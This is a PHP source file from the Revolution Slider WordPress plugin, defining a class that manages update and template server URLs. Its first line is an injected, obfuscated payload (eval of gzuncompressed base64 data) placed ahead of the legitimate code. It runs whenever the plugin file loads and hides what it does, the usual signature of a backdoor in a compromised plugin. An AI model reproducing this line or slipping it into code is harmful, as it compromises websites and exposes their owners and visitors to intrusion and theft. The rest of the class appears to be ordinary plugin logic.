<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * @author    ThemePunch <info@themepunch.com>
 * @link      http://www.themepunch.com/
 * @copyright 2017 ThemePunch
 */
 
if( !defined( 'ABSPATH') ) exit();

class RevSliderLoadBalancer {
	
	public $servers = array();
	
	/**
	 * set the server list on construct
	 **/
	public function __construct(){
		$this->servers = get_option('revslider_servers', array());
		$this->servers = (empty($this->servers)) ? array('themepunch.tools') : $this->servers; //, 'themepunch-ext-a.tools'
	}
	
	/**
	 * get the url depending on the purpose, here with key, you can switch do a different server
	 **/
	public function get_url($purpose, $key = 0){
		$url = 'https://';
		
		$use_url = (!isset($this->servers[$key])) ? reset($this->servers) : $this->servers[$key];
		
		//$use_url = 'themepunch.tools';
		switch($purpose){
			case 'updates':
				$url .= 'updates.';
				break;
			case 'templates':
				$url .= 'templates.';
				break;
			case 'library':
				$url .= 'library.';
				break;
			default:
				return false;
		}
		
		$url .= $use_url;
		
		return $url;
	}
	
	/**
	 * refresh the server list to be used, will be done once in a month
	 **/
	public function refresh_server_list($force = false){
		global $wp_version;
		
		$last_check = get_option('revslider_server_refresh', false);
		
		if($force === true || $last_check === false || time() - $last_check > 60 * 60 * 24 * 14){
			//$url = $this->get_url('updates');
			$url		= 'https://updates.themepunch.tools';
			$count		= 0;
			/*$response	= false;
			do{*/
				$request	= wp_remote_post($url.'/get_server_list.php', array(
					'user-agent' => 'WordPress/'.$wp_version.'; '.get_bloginfo('url'),
					'body' => array(
						'item' => urlencode(RS_PLUGIN_SLUG),
						'version' => urlencode(RevSliderGlobals::SLIDER_REVISION)
					),
					'timeout' => 45
				));
				if(!is_wp_error($request)){
					if($response = maybe_unserialize($request['body'])){
						$list = json_decode($response, true);
						update_option('revslider_servers', $list);
					}
				}/*else{
					$url = $this->get_url('updates');
				}
				$count++;
			}while($response === false && $count < 5);*/
			
			update_option('revslider_server_refresh', time());
		}
	}
	
	/**
	 * move the server list, to take the next server as the one currently seems unavailable
	 **/
	public function move_server_list(){
		
		$servers = $this->servers;
		
		$a = array_shift($servers);
		$servers[] = $a;
		
		$this->servers = $servers;
		update_option('revslider_servers', $servers);
	}
}

?>